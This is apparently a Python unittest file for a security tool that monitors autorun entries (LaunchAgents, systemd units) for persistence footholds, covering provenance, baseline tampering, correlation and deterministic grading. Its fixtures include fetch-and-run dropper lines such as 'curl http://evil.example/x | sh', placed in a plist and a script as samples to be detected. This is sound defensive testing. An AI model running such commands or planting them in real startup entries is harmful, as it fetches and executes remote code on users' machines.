#!/usr/bin/env python3
"""Autorun-surface monitor (#1333): catch a NOVEL foothold in a KNOWN location by fusing novelty +
provenance + content-shape + correlation — no signature required. Also locks the load-bearing safety
property: the baseline is NEVER trusted for safety (a tampered/absent baseline can't launder a
foothold), grading is deterministic at any -j, and non-regular files are never opened."""
from __future__ import annotations

import os
import plistlib
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.hygiene import models
from stayawake.bots.security.hygiene.autorun import surface, provenance, grade, baseline, check_autorun

_ATTR = "stayawake.bots.security.hygiene.autorun.provenance"


def _agent(**plist) -> bytes:
    return plistlib.dumps(plist)


class _Surface(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix="autorun-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.d, ignore_errors=True))
        self.state = Path(tempfile.mkdtemp(prefix="autorun-state-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.state, ignore_errors=True))
        # isolate the baseline file + force a non-CI (workstation) env so novelty is exercised
        self.env = mock.patch.dict(os.environ, {
            "SAW_AUTORUN_BASELINE": str(self.state / "baseline.json"), "CI": ""})
        self.env.start()
        self.addCleanup(self.env.stop)
        self.dirs = mock.patch(
            "stayawake.bots.security.hygiene.os_service.user_persistence_dirs", return_value=[self.d])
        self.dirs.start()
        self.addCleanup(self.dirs.stop)

    def write(self, name: str, **plist):
        (self.d / name).write_bytes(_agent(**plist))

    def ids(self, issues):
        return {i.id for i in issues}


class TestSurfaceParse(_Surface):
    def test_parses_launch_agent_exec_and_persistence(self):
        self.write("x.plist", ProgramArguments=["/tmp/p", "-q"], RunAtLoad=True, StartInterval=60)
        (e,) = surface.enumerate_entries()
        self.assertEqual(e.exec_path, "/tmp/p")
        self.assertIn("run-at-load", e.persistence)
        self.assertIn("poll-interval=60s", e.persistence)

    def test_parses_systemd_execstart(self):
        (self.d / "w.service").write_text("[Service]\nExecStart=-/usr/bin/foo --bar\n[Install]\nWantedBy=default.target\n")
        (e,) = surface.enumerate_entries()
        self.assertEqual(e.exec_path, "/usr/bin/foo")     # leading `-` modifier stripped
        self.assertIn("enabled", e.persistence)

    def test_non_regular_file_is_never_opened(self):
        if not hasattr(os, "mkfifo"):
            self.skipTest("no mkfifo")
        os.mkfifo(self.d / "evil.plist")                  # a FIFO named like a plist would hang open()
        self.assertEqual(surface.enumerate_entries(), [])  # skipped via pathsafe, returns quickly


class TestProvenance(unittest.TestCase):
    def test_path_classification(self):
        self.assertEqual(provenance._classify_path("/usr/bin/x"), "trusted")
        self.assertEqual(provenance._classify_path("/Applications/Z.app/Contents/MacOS/z"), "trusted")
        self.assertEqual(provenance._classify_path("/tmp/x"), "untrusted")
        self.assertEqual(provenance._classify_path("~/.cache/x"), "untrusted")
        self.assertEqual(provenance._classify_path("/home/u/bin/x"), "unknown")

    def test_fail_closed_to_unattributed_on_subprocess_error(self):
        e = surface.AutorunEntry(location="l", path=Path("/x"), argv=["/home/u/bin/tool"])
        with mock.patch(f"{_ATTR}._run", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            a = provenance.attribute(e)
        self.assertFalse(a.attributed)                    # unknown owner + unknown sign → NOT blessed

    def test_owner_or_trusted_signed_is_attributed(self):
        self.assertTrue(provenance.Attribution("trusted", owner="coreutils").attributed)
        self.assertTrue(provenance.Attribution("trusted", signed=True).attributed)
        self.assertFalse(provenance.Attribution("trusted", signed=False).attributed)  # unsigned → not
        self.assertFalse(provenance.Attribution("untrusted").attributed)


class TestFusionGrading(_Surface):
    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_attributed_benign_is_clean(self):
        self.write("ok.plist", ProgramArguments=["/usr/bin/true"], RunAtLoad=True)
        self.assertEqual(self._run(signed=True), [])       # trusted + signed + no bad shape → clean

    def test_fetch_exec_is_a_foothold_even_if_signed(self):
        self.write("bad.plist", ProgramArguments=["/usr/bin/curl", "http://x", "|", "sh"], RunAtLoad=True)
        issues = self._run(signed=True)
        self.assertIn(models.HygieneIssue, {type(i) for i in issues})
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))

    def test_untrusted_path_with_persistence_is_a_foothold(self):
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_referenced_script_payload_is_caught(self):
        # the payload lives in the referenced SCRIPT, not the unit file — the monitor reads it (for an
        # unattributed entry) and catches the dropper without a signature for it.
        script = self.d / "run.sh"
        script.write_text("#!/bin/sh\ncurl http://evil.example/x | sh\n")
        self.write("s.plist", ProgramArguments=[str(script)], RunAtLoad=False)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_foothold_drives_rotation_unsafe_and_exit3(self):
        # a strong autorun finding is an ACTIVE_PERSISTENCE id → rotation UNSAFE (→ audit exit 3, #1332)
        self.assertIn("autorun-unattributed-foothold", models.ACTIVE_PERSISTENCE_IDS)
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        ids = self.ids(self._run(signed=None))
        self.assertTrue(ids & models.ROTATION_UNSAFE_IDS)


class TestNoveltyReview(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_new_unattributed_nonstrong_is_review_only_after_baseline(self):
        # an unattributed entry on an 'unknown' path with no bad shape: first run captures baseline and
        # stays quiet on the review tier; a NEW one on a later run is an info review item.
        self.write("a.plist", ProgramArguments=["/home/u/bin/mytool"], RunAtLoad=False)
        first = self._run()
        self.assertNotIn("autorun-new-unattributed", self.ids(first))   # first run: no novelty nag
        self.write("b.plist", ProgramArguments=["/home/u/bin/other"], RunAtLoad=False)
        second = self._run()
        review = [i for i in second if i.id == "autorun-new-unattributed"]
        self.assertEqual(len(review), 1)                               # the NEW entry only
        self.assertEqual(review[0].severity, "info")


class TestBaselineNotLoadBearing(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_foothold_caught_even_when_baseline_marks_it_known(self):
        # THE load-bearing property: launder the foothold into the baseline as 'known'; it must STILL
        # be caught (provenance + shape run regardless of the baseline).
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()                                        # capture a baseline that now knows evil.plist
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_tampered_baseline_is_detected_and_ignored(self):
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()
        p = baseline.baseline_path()                       # hand-edit entries without fixing self_hash
        import json
        data = json.loads(p.read_text()); data["entries"]["/laundered"] = "x"; p.write_text(json.dumps(data))
        b = baseline.load_baseline()
        self.assertEqual(b.status, "tampered")
        self.assertFalse(b.trusted)                        # → novelty ignored, foothold still graded
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))


class TestCorrelation(_Surface):
    def test_shared_unattributed_payload_across_entries(self):
        # two agents wired to the SAME unattributed payload — the campaign shape.
        self.write("a.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        self.write("b.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            issues = check_autorun()
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))   # correlated → strong


class TestDeterminism(_Surface):
    def test_grading_identical_at_any_worker_count(self):
        for i in range(6):
            self.write(f"a{i}.plist", ProgramArguments=[f"/tmp/x{i}"], RunAtLoad=True)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            one = [(i.id, i.title) for i in check_autorun(jobs=1)]
            many = [(i.id, i.title) for i in check_autorun(jobs=8)]
        self.assertEqual(one, many)                        # submission-order → byte-identical findings


if __name__ == "__main__":
    unittest.main()
